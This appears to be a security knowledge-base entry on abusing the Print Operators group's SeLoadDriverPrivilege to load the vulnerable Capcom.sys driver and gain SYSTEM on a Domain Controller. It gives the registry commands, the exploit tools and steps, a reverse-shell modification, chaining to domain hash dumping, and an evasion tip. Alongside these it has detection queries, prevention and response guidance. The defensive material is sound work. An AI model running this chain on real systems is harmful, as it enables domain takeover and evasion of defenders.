examples.command:

examples.label: Enable SeLoadDriverPrivilege and load the driver
Exploit the loaded Capcom driver for a SYSTEM shell

notes:
=== Print Operators - SeLoadDriverPrivilege → Kernel Exploit → SYSTEM ===
Print Operators get SeLoadDriverPrivilege - load Capcom.sys signed driver → SYSTEM on DC.

=== PRIVILEGE AND REQUIREMENTS ===
SeLoadDriverPrivilege: allows loading/unloading kernel device drivers
Print Operators also: manage printers on DCs + log on locally to DCs
Privilege is DISABLED in non-elevated context due to UAC → must bypass UAC first
Windows 10 1803+: HKCU registry references for SeLoadDriverPrivilege are BLOCKED - technique mostly applies to older DCs

=== CAPCOM.SYS ATTACK CHAIN ===
Capcom.sys: vulnerable SIGNED driver with function to execute arbitrary shellcode as SYSTEM.
Signed = loads without kernel code signing bypass needed.

Step 1: Compile privilege enabler
  Modify EnableSeLoadDriverPrivilege.cpp (correct Windows headers)
  cl.exe from VS Developer Command Prompt

Step 2: Register driver in HKCU registry (user-owned key - no admin needed for HKCU)
  reg add "HKCU\System\CurrentControlSet\Capcom" /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
  reg add "HKCU\System\CurrentControlSet\Capcom" /v Type /t REG_DWORD /d 1
  \??\ = NT Object Path syntax required for NTLoadDriver (resolves full NT object path)

Step 3: Enable privilege and load driver
  .\EnableSeLoadDriverPrivilege.exe
  Verify: DriverView.exe confirms Capcom.sys in kernel

Step 4: Exploit the driver
  .\ExploitCapcom.exe
  → Capcom function executes shellcode → token steal from SYSTEM process → SYSTEM shell

=== AUTOMATED ALTERNATIVE ===
EoPLoadDriver.exe <HKCU_reg_path> <driver_file_path>
Consolidates steps 2-3 into single command.
Then run ExploitCapcom.exe.

=== NO GUI MODIFICATION ===
Edit ExploitCapcom.cpp line 292: replace "cmd.exe" with reverse shell binary path
Recompile before transfer for non-interactive shell delivery

=== CLEANUP ===
reg delete "HKCU\System\CurrentControlSet\Capcom" /f

=== CHAINING CONTEXT ===
Print Operators → UAC bypass (UACMe or srrstr DLL) → elevated shell → Capcom → SYSTEM on DC
SYSTEM on DC → secretsdump → domain hashes → golden ticket
SeLoadDriverPrivilege + other vulnerable signed drivers (not just Capcom) = same result
name: Print Operators - SeLoadDriver Capcom Abuse
description: Print Operators hold SeLoadDriverPrivilege. Load the vulnerable Capcom.sys driver via a HKCU registry reference, then run ExploitCapcom to execute a shell as SYSTEM. EoPLoadDriver automates the registry+load steps.

defense.why_it_works: Print Operators can log on locally to Domain Controllers and hold the SeLoadDriverPrivilege. This privilege allows loading kernel-mode drivers. By loading the vulnerable Capcom.sys driver (which exposes a controlled kernel-mode execution primitive), an attacker can escalate to SYSTEM on the DC. The EoPLoadDriver tool and ExploitCapcom exploit this chain.
defense.prerequisites: Membership in Print Operators group. SeLoadDriverPrivilege granted. Target must be running a Windows version where the Capcom.sys exploit is applicable. Ability to write a registry key under HKCU for driver path.
defense.impact: Kernel-level code execution as SYSTEM on the Domain Controller. Full domain compromise - can dump NTDS.dit, add Domain Admins, disable defenses.
defense.detection: Driver load events in System event log (Event ID 7045). Registry key creation under HKCU\System\CurrentControlSet\ by non-admin. Suspicious .sys files in tool directories. ExploitCapcom process execution.
defense.artifacts: System event log: Capcom driver loaded (Event 7045) | Registry: HKCU\System\CurrentControlSet\CAPCOM created | Process: EnableSeLoadDriverPrivilege.exe and ExploitCapcom.exe executed
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:System" EventCode=7045
| table _time, Computer, Service_Name, Service_File_Name

index=sysmon EventCode=13 TargetObject="*HKU\\*\\CurrentControlSet\\Capcom*"
| table _time, Computer, Image, TargetObject
defense.sentinel_kql:
DeviceEvents
| where ActionType == "DriverLoad" or (ActionType == "RegistryValueSet" and RegistryKey has "CurrentControlSet\\Capcom")
| project Timestamp, DeviceName, InitiatingProcessAccountName, AdditionalFields
| union (DeviceProcessEvents | where FileName in~ ("EoPLoadDriver.exe","ExploitCapcom.exe") | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, AdditionalFields=ProcessCommandLine)
| sort by Timestamp desc
defense.prevention: Audit Print Operators group membership - treat it as equivalent to Domain Admin on DCs. Restrict local logon to DCs via Group Policy (Allow log on locally). Consider removing SeLoadDriverPrivilege from Print Operators where not required. Block known vulnerable drivers (Capcom.sys) via Windows Defender Application Control (WDAC) policy.
defense.misconfiguration: Accounts unnecessarily added to Print Operators group. SeLoadDriverPrivilege not restricted via GPO. No WDAC policy blocking vulnerable signed drivers.
defense.vulnerable_config:
# User in Print Operators
whoami /groups | findstr 'Print Operators'

# Exploit chain:
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d '\\??\\C:\Tools\Capcom.sys'
EnableSeLoadDriverPrivilege.exe
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
.\ExploitCapcom.exe
defense.secure_config:
# Audit Print Operators group
Get-ADGroupMember -Identity 'Print Operators'

# Restrict local DC logon
# GPO: Computer Configuration > Windows Settings > Security Settings
#      > Local Policies > User Rights Assignment
#      > Allow log on locally: Administrators only

# WDAC: block known vulnerable drivers
# New-CIPolicy -FilePath .\policy.xml -Level Publisher -Deny
defense.evasion: Load the driver for execution then remove it; SeLoadDriver abuse is a single event - do it once.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Microsoft Defender for Endpoint, Windows Security Event Log, Sysmon for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Abuses Print Operators' SeLoadDriverPrivilege to load a vulnerable driver and get SYSTEM:
  EoPLoadDriver.exe        register the driver under HKCU and load it via NtLoadDriver
  System\CurrentControlSet\Capcom   the registry path it creates for the service
  c:\Tools\Capcom.sys      the vulnerable Capcom driver to load
With the driver loaded, ExploitCapcom runs a shell as SYSTEM by abusing its kernel primitive.
